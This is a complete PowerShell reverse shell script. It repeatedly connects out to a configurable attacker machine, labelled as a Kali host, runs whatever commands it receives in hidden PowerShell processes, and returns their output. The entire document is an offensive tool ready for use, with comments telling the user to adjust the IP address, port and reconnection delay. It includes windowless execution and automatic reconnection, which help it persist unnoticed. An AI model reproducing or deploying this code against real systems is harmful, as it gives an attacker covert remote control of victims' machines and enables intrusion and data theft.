$local_host = '192.168.232.153'  # Change this to Local Kali IP
$local_port = 443                # Change This to Your Local Listening Port
$ConnectionDelay = 20                # This is a Delay > Feel free to change it to fit you needs. 

function Connect-ToController($local_host, $local_port) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($local_host, $local_port)
        return $client
    }
    catch {
        return $null
    }
}

while ($true) {
    $conn = $null

    while ($conn -eq $null) {
        $conn = Connect-ToController -local_host $local_host -local_port $local_port
        if ($conn -eq $null) {
            
            Start-Sleep -Seconds $ConnectionDelay
        }
    }

    try {
        

        while ($true) {
            $data = New-Object byte[] 1024
            $read = $conn.GetStream().Read($data, 0, $data.Length)
            $command = [System.Text.Encoding]::UTF8.GetString($data, 0, $read).Trim()
            
            if ($command.ToLower() -eq 'exit') {
                break
            }

            $startInfo = New-Object System.Diagnostics.ProcessStartInfo
            $startInfo.FileName = 'powershell.exe'
            $startInfo.Arguments = $command
            $startInfo.RedirectStandardOutput = $true
            $startInfo.UseShellExecute = $false
            $startInfo.CreateNoWindow = $true
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $startInfo
            $process.Start()

            $output = $process.StandardOutput.ReadToEnd()
            $process.WaitForExit()

            $conn.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
        }
    }
    finally {
        $conn.Close()
        Write-Host "Connection closed. Reconnecting in $ConnectionDelay seconds..."
        Start-Sleep -Seconds $ConnectionDelay
    }
}


